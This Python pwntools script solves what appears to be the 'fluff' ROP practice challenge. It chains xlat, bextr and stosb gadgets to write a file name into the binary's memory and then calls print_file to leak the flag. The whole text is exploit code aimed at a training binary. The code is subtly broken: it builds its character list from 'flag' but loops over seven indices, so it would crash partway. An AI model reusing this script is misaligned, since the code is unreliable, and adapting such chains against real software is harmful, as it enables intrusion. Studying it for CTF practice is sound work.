from pwn import *
context.log_level = 'debug'

io = process('./fluff')
elf = ELF('./fluff')

xlat = 0x400628
bextr = 0x40062A
stosb = 0x400639
zero_seg = 0x600fa0
write_addr = 0x601038
rdi = 0x4006A3
main_addr = 0x400607

char_addr = [0x4003C4, 0x4003C1, 0x4003D6, 0x4003CF, 0x4003C9, 0x4003D8, 0x400246, 0x4003D8]
char = [ord(x) for x in 'flag']

print(char)

payload = cyclic(40)
payload += p64(rdi) + p64(write_addr)			# make rdi point to address needed to write

# make 'f' into 0x601038
payload += p64(bextr) + p64(0x2000) + p64(zero_seg - 0x3EF2 - 0xb)		# start = 0, len = 0x20, equals mov rbx, rcx
payload += p64(xlat)
payload += p64(bextr) + p64(0x2000) + p64(char_addr[0] - 0x3EF2)
payload += p64(xlat)
payload += p64(stosb)

for i in range(7):
	payload += p64(bextr) + p64(0x2000) + p64(char_addr[i + 1] - char[i] - 0x3EF2)
	payload += p64(xlat)
	payload += p64(stosb)

payload += p64(rdi) + p64(write_addr)

payload += p64(elf.plt['print_file'])

io.sendlineafter(b'> ', payload)
io.interactive()